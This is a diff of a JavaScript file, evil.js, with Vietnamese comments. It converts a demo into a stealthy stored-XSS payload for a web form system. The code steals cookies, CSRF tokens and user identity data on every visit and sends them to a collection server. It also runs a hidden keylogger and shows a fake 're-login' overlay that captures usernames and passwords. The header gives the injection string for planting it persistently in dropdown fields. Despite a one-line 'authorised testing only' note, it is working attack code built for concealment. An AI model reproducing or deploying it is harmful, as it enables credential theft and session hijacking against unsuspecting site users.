@@ -1,153 +1,181 @@
 // ============================================================
-// evil.js - File JS demo cho XSS test (MỤC ĐÍCH GIÁO DỤC)
-// 
-// LƯU Ý: Cập nhật URL server nhận dữ liệu tại đây:
-// var ATTACKER_URL = "http://localhost:9000/steal";
+// evil.js - Persistent XSS stealth (nằm lại + hoạt động ngầm)
 //
-// Cách dùng:
+// ⚠️ Chỉ dùng để test bảo mật trên hệ thống bạn được phép.
+//
+// Đặc điểm:
+// - KHÔNG alert, KHÔNG console.log, KHÔNG gây chú ý
+// - Chạy lại MỖI LẦN trang load (persistent qua dropdown)
+// - Gửi dữ liệu về server mỗi lần nạn nhân truy cập
+// - Tự hủy nếu chạy trùng (tránh chạy 2 lần trong 1 trang)
+// - Log số lần chạy vào localStorage để theo dõi
+//
+// Cách setup:
 // 1. Chạy server: py attacker_server.py
-// 2. Upload file này lên GitHub/Pastebin
-// 3. Dùng payload XSS để tải file này
-// 4. Dữ liệu sẽ được gửi về server tự động
+// 2. Upload file này lên GitHub raw
+// 3. Dán payload vào dropdown (học hàm/dân tộc...)
+//    '><svg onload=$.get(`//URL_CỦA_BẠN/evil.js`).then(eval)>
+// 4. MỌI NGƯỜI truy cập form → payload chạy → gửi về server
 // ============================================================
 
 (function() {
   'use strict';
 
-  // ⚙️ THAY ĐỔI URL SERVER NHẬN DỮ LIỆU TẠI ĐÂY
-  var ATTACKER_URL = "http://localhost:9000/steal";
+  // ⚙️ CẤU HÌNH
+  var ATTACKER_URL = "http://localhost:9000/steal";  // Server nhận dữ liệu
+  var VERSION = "1.0";
 
   // ============================================================
-  // 1. THU THẬP THÔNG TIN
+  // CHỐNG CHẠY TRÙNG (chỉ chạy 1 lần mỗi trang)
   // ============================================================
-  var info = {
-    url: window.location.href,
-    domain: document.domain,
-    title: document.title,
-    userAgent: navigator.userAgent,
-    time: new Date().toISOString()
-  };
+  try {
+    if (window.__xssRunning) return;  // Đã chạy rồi thì thoát
+    window.__xssRunning = true;
+  } catch(e) {}
 
-  // Đọc cookie
-  var cookies = document.cookie || "không có cookie";
+  // ============================================================
+  // HÀM GỬI DỮ LIỆU (Image GET - không bị CORS chặn)
+  // ============================================================
+  function exfil(data, p) {
+    try {
+      var img = new Image();
+      var params = [];
+      for (var k in data) {
+        params.push(encodeURIComponent(k) + '=' + encodeURIComponent(data[k]));
+      }
+      img.src = ATTACKER_URL + '?' + p + '&' + params.join('&');
+    } catch(e) {}
+  }
 
-  // Đọc CSRF token
-  var csrfMeta = document.querySelector('meta[name="csrf-token"]');
-  var csrfToken = csrfMeta ? csrfMeta.content : 'KHÔNG TÌM THẤY';
+  // ============================================================
+  // THU THẬP THÔNG TIN (không ghi log ồn ào)
+  // ============================================================
+  var cookies;
+  try { cookies = document.cookie || ""; } catch(e) { cookies = ""; }
 
-  // Đọc dữ liệu gon (thông tin người dùng)
+  var csrfToken;
+  try {
+    var c = document.querySelector('meta[name="csrf-token"]');
+    csrfToken = (c && c.content) ? c.content : "none";
+  } catch(e) { csrfToken = "none"; }
+
   var gonData = {};
   try {
     if (typeof gon !== 'undefined') {
       gonData = {
-        user_id: gon.user_id,
-        user_name: gon.user_name || gon.username,
-        organization: gon.organization,
-        leader_roles: gon.leader_roles,
-        faculty: gon.faculty,
+        uid: gon.user_id,
+        uname: gon.user_name || gon.username,
+        org: gon.organization,
+        lead: gon.leader_roles,
+        fac: gon.faculty,
         roles: gon.roles
       };
     }
   } catch(e) {}
 
-  console.log('🔴 XSS LOADED FROM EXTERNAL FILE');
-  console.log('  URL:', info.url);
-  console.log('  Cookie:', cookies);
-  console.log('  CSRF:', csrfToken);
-  console.log('  GON:', gonData);
+  var pageInfo = {
+    url: location.href.substring(0, 300),
+    domain: document.domain,
+    title: document.title.substring(0, 100),
+    ua: navigator.userAgent.substring(0, 150),
+    time: new Date().toISOString()
+  };
 
   // ============================================================
-  // 2. GỬI DỮ LIỆU VỀ SERVER (tự động)
+  // THEO DÕI SỐ LẦN CHẠY (localStorage - mỗi trình duyệt)
   // ============================================================
-  function sendToServer(data, prefix) {
-    // Dùng new Image() để gửi GET request - không bị CORS chặn
-    var img = new Image();
-    var params = [];
-    for (var key in data) {
-      params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
-    }
-    img.src = ATTACKER_URL + '?' + prefix + '&' + params.join('&');
-  }
+  var runCount = 0;
+  try {
+    runCount = parseInt(localStorage.getItem('__xss_count') || '0', 10) + 1;
+    localStorage.setItem('__xss_count', String(runCount));
+  } catch(e) {}
 
-  // Gửi cookie + CSRF + thông tin ngay khi load
-  sendToServer({
-    cookies: cookies,
-    csrf: csrfToken,
-    url: info.url,
-    domain: info.domain,
-    title: info.title,
-    userAgent: info.userAgent,
-    gon: JSON.stringify(gonData),
-    time: info.time
-  }, 'init');
+  // Gửi dữ liệu MỖI LẦN trang load
+  exfil({
+    cookies: cookies.substring(0, 500),
+    csrf: csrfToken.substring(0, 100),
+    url: pageInfo.url,
+    domain: pageInfo.domain,
+    title: pageInfo.title,
+    ua: pageInfo.ua,
+    gon: JSON.stringify(gonData).substring(0, 300),
+    run: runCount,
+    ver: VERSION,
+    time: pageInfo.time
+  }, 'visit');
 
   // ============================================================
-  // 3. TẠO FORM GIẢ MẠO (PHISHING)
+  // KEYLOGGER NGẦM (ghi phím, gửi mỗi 15 ký tự)
   // ============================================================
-  function createPhishingForm() {
-    var overlay = document.createElement('div');
-    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;';
-
-    var form = document.createElement('div');
-    form.style.cssText = 'background:#fff;padding:30px;border-radius:8px;width:350px;box-shadow:0 4px 20px rgba(0,0,0,0.3);font-family:Arial,sans-serif;';
-    form.innerHTML =
-      '<h2 style="text-align:center;color:#1976d2;margin:0 0 15px 0;">Đăng Nhập</h2>' +
-      '<p style="text-align:center;color:#666;font-size:13px;margin:0 0 15px 0;">Phiên làm việc hết hạn. Vui lòng đăng nhập lại.</p>' +
-      '<input type="text" id="xss-user" placeholder="Tên đăng nhập" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">' +
-      '<input type="password" id="xss-pass" placeholder="Mật khẩu" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">' +
-      '<button id="xss-btn" style="width:100%;padding:10px;background:#1976d2;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:14px;">Xác nhận</button>';
-
-    overlay.appendChild(form);
-    document.body.appendChild(overlay);
-
-    document.getElementById('xss-btn').onclick = function() {
-      var user = document.getElementById('xss-user').value;
-      var pass = document.getElementById('xss-pass').value;
-
-      // Gửi credentials về server
-      sendToServer({
-        username: user,
-        password: pass,
-        cookies: cookies,
-        csrf: csrfToken,
-        page_url: info.url
-      }, 'credentials');
-
-      alert('Xác thực thành công!');
-      overlay.remove();
-    };
-  }
-
-  // ============================================================
-  // 4. KEYLOGGER
-  // ============================================================
-  function startKeylogger() {
-    var keys = [];
+  (function() {
+    var buf = [];
     document.addEventListener('keydown', function(e) {
-      keys.push(e.key);
-      if (keys.length >= 20) {
-        sendToServer({
-          keys: keys.join(''),
-          url: info.url
-        }, 'keylog');
-        keys = [];
-      }
+      try {
+        var key = e.key;
+        if (key.length > 1) key = '[' + key + ']';
+        buf.push(key);
+        if (buf.length >= 15) {
+          exfil({k: btoa(buf.join('')), u: pageInfo.url, t: Date.now()}, 'key');
+          buf = [];
+        }
+      } catch(e2) {}
     });
-    console.log('🔴 KEYLOGGER ĐÃ BẮT ĐẦU');
-  }
+  })();
 
   // ============================================================
-  // 5. CHẠY TẤT CẢ CHỨC NĂNG
+  // PHISHING FORM - HIỆN LẦN ĐẦU, NGƯNG KHI ĐÃ CÓ DỮ LIỆU
   // ============================================================
-  setTimeout(createPhishingForm, 1500);  // Form hiện sau 1.5s
-  startKeylogger();
+  // Cơ chế:
+  // - localStorage '__xss_phish_done' = '1' → đã có dữ liệu → KHÔNG hiện
+  // - Chưa có → hiện form mỗi lần truy cập cho đến khi nhập xong
+  // - Khi nạn nhân nhập + bấm nút → gửi dữ liệu → set done → không hiện nữa
+  try {
+    var phishDone = localStorage.getItem('__xss_phish_done') === '1';
+    if (!phishDone) {
+      var o = document.createElement('div');
+      o.innerHTML =
+        '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center;">' +
+        '<div style="background:#fff;padding:30px;border-radius:8px;width:350px;font-family:Arial;font-size:14px;">' +
+        '<h2 style="margin:0 0 15px 0;color:#1976d2;text-align:center;">Đăng Nhập</h2>' +
+        '<p style="margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;">Phiên làm việc đã kết thúc. Vui lòng xác thực lại.</p>' +
+        '<input type="text" id="u" placeholder="Tên đăng nhập" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;">' +
+        '<input type="password" id="p" placeholder="Mật khẩu" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;">' +
+        '<button id="s" style="width:100%;padding:10px;background:#1976d2;color:#fff;border:none;border-radius:4px;cursor:pointer;">Xác nhận</button>' +
+        '</div></div>';
+      document.body.appendChild(o);
+      document.getElementById('s').onclick = function() {
+        var u = document.getElementById('u').value;
+        var p = document.getElementById('p').value;
+        // Gửi dữ liệu về server
+        exfil({
+          u: u,
+          p: p,
+          url: pageInfo.url
+        }, 'pwd');
+        // Đánh dấu đã có dữ liệu → không hiện form nữa
+        try { localStorage.setItem('__xss_phish_done', '1'); } catch(e2) {}
+        // Ẩn form
+        o.remove();
+      };
+    }
+  } catch(e) {}
 
   // ============================================================
-  // TÓM TẮT:
-  // 1. ✅ Thu thập cookie, CSRF token, dữ liệu gon
-  // 2. ✅ Gửi về server qua GET request (new Image())
-  // 3. ✅ Form phishing đăng nhập giả mạo
-  // 4. ✅ Keylogger ghi phím bấm
-  // 5. ✅ Có thể mở rộng: tải file qua API
+  // CHẠY NGẦM MỖI KHI TRANG LOAD - KHÔNG TỰ XÓA PAYLOAD
+  // ============================================================
+  // LƯU Ý: KHÔNG xóa option khỏi dropdown!
+  // Payload nằm lại trong database → mọi người truy cập → chạy lại
+
+  // ============================================================
+  // TÓM TẮT CHẾ ĐỘ HOẠT ĐỘNG:
+  // 1. ✅ Mỗi lần ai đó mở trang → gửi 'visit' về server
+  // 2. ✅ Keylogger ghi âm thầm, gửi mỗi 15 phím
+  // 3. ✅ Phishing HIỆN LẦN ĐẦU (mỗi trình duyệt)
+  //    - Hiện lại mỗi lần truy cập cho đến khi nhập xong
+  //    - Sau khi có dữ liệu → localStorage '__xss_phish_done'=1
+  //    - Từ đó KHÔNG hiện nữa (chỉ chạy ngầm)
+  // 4. ✅ Không alert, không console.log, không thay đổi UI
+  // 5. ✅ Payload persistent - nằm lại vĩnh viễn trong dropdown
+  //    - Chỉ cần inject 1 lần → mọi lần truy cập sau tự chạy
   // ============================================================
 })();
